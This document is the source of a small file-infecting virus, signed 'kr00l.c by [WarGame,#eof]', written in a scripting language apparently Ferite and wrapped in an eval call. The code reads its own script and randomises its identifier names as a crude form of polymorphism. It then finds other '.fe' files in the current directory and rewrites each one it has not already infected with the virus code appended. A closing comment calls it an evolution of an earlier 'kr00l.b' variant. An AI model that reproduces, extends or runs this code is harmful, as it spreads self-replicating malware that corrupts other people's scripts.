eval('uses "filesystem","sys","regexp","math","string","date";function Is_Infected(string fl) { string st = File.open(fl).toString(); if(String.index(st,"kr00l.c by [WarGame,#eof]") != -1) {return 1;} else {return 0;}} function rnd(number sd) { Math.srand(sd); return String.sprintf("%c%c%c%c",((Math.rand()%10)+65),((Math.rand()%10)+65),((Math.rand()%10)+65),((Math.rand()%10)+65));} string signature = "kr00l.c by [WarGame,#eof]";string fl = "";string my_code = "";object pr =  File.open(Sys.scriptName());string orig = "";object dir = new Directory("."); while(String.index((my_code = pr.readln()),signature) == -1) {} if(1) { my_code = Regexp.replaceAll("signature",my_code,rnd(Date.now()+1989)); my_code = Regexp.replaceAll("orig",my_code,rnd(Date.now()+1992)); my_code = Regexp.replaceAll("dir",my_code,rnd(Date.now()+1922)); my_code = Regexp.replaceAll("fl",my_code,rnd(Date.now()+1981)); my_code = Regexp.replaceAll("Is_Infected",my_code,rnd(Date.now()+1975)); my_code = Regexp.replaceAll("rnd",my_code,rnd(Date.now()+1960));  my_code = Regexp.replaceAll("my_code",my_code,rnd(Date.now()+2006));} while((fl = dir.getEntry()) != "") { if(String.index(Sys.scriptName(),fl) == -1 && String.index(fl,".fe") != -1) {  if(!Is_Infected(fl)) { orig = File.open(fl).toString(); File.remove(fl); File.create(fl).writeln(orig+my_code); } } } ');






//  Evolution of kr00l.b with poly ... its name is kr00l.c ... by [WarGame,#eof]
